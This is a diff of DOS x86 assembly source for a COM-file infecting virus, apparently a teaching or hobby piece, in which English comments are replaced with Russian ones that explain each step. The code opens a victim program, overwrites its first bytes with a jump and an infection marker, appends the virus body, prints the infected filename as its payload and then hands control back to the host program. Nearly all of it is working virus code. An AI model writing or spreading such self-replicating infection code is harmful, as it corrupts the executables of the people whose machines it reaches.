@@ -73,65 +73,65 @@ file_open:
     sub ax, 4 ; поправка на первые 4 байта этой программы, которые не записываем
     mov [bp + victim_bp], ax
 
-    ; moving carret to the start
+    ; перемещение каретки в начало
     mov cx, 0
     mov dx, 0
     mov ax, 4200h
     int 21h
 
-    ; inserting load injection
-    mov [bp + byte_buffer], 0e9h ; word-pointer jmp
+    ; перезапись первых 4 байтов
+    mov [bp + byte_buffer], 0e9h ; идентификатор трехбайтного безусловного переноса (jmp)
     lea dx, [bp + byte_buffer]
     mov cx, 1
     mov ah, 40h
     int 21h
 
-    mov ax, [bp + jmp_length] ; jmp offset
-    sub ax, 3 ; jmp command size
+    mov ax, [bp + jmp_length] ; величина перехода
+    sub ax, 3 ; размер самой команды jmp
     mov [bp + word_buffer], ax
     lea dx, [bp + word_buffer]
     mov cx, 2
     mov ah, 40h
     int 21h
 
-    mov [bp + byte_buffer], 069h
+    mov [bp + byte_buffer], 069h ; метка заражения
     lea dx, [bp + byte_buffer]
     mov cx, 1
     mov ah, 40h
     int 21h
     
-    ; moving carret to the end
+    ; перемещение каретки в конец файла
     mov cx, 0
     mov dx, 0
     mov ax, 4202h
     int 21h
 
-    ; writing inserting code
-    mov [bp + byte_buffer], 0bdh ; mov bp command
+    ; вставка mov bp, {_} кода
+    mov [bp + byte_buffer], 0bdh ; идентификатор команды mov bp
     lea dx, [bp + byte_buffer]
     mov cx, 1
     mov ah, 40h
     int 21h
 
-    lea dx, [bp + victim_bp] ; value for bp
+    lea dx, [bp + victim_bp] ; значение регистра bp для заражаемого файла
     mov cx, 2
     mov ah, 40h
     int 21h
 
-    ; writing virus
+    ; запись основного тела вируса
     lea dx, [bp + code]
     mov cx, offset vir_end
     sub cx, offset code
     mov ah, 40h
     int 21h
 
-    ; closing file
+    ; закрытие файла
     mov ah, 3eh
     int 21h
 
     ; PAYLOAD BEGIN
 
-    ; output infected filename
+    ; полезная нагрузка вируса (вывод на экран имя зараженного файла)
     lea dx, [bp + file.fname]
     call str_f2c
     mov ah, 09h
@@ -140,13 +140,14 @@ file_open:
 
     ; PAYLOAD END
 
-    ; redirect to original program
+    ; передача управления оригинальной программе
 redirect:
     mov ax, 100h
     jmp ax
 
 procedures:
 
+    ; процедура реформатирования строки для работы с файлами в строку для вывода на консоль
     str_f2c proc
         push cx
         push bx
@@ -168,6 +169,7 @@ procedures:
         jmp str_f2c_popret
     str_f2c endp
 
+    ; процедура реформатирования строки для вывода на консоль в строку для работы с файлами
     str_c2f proc
         push cx
         push bx
@@ -191,9 +193,12 @@ procedures:
 
 data:
 
+    ; 4 первые якобы оригинальные байта этой самой программы:
+    ;   mov ah, 4ch
+    ;   int 21h
     leading_bytes db 0b4h, 4ch, 0cdh, 21h
 
-    ; DTA buffer structure
+    ; структура буфера DTA
     DTAFileInfo struc
         freserved db 21 dup(?)
         fattr db ?
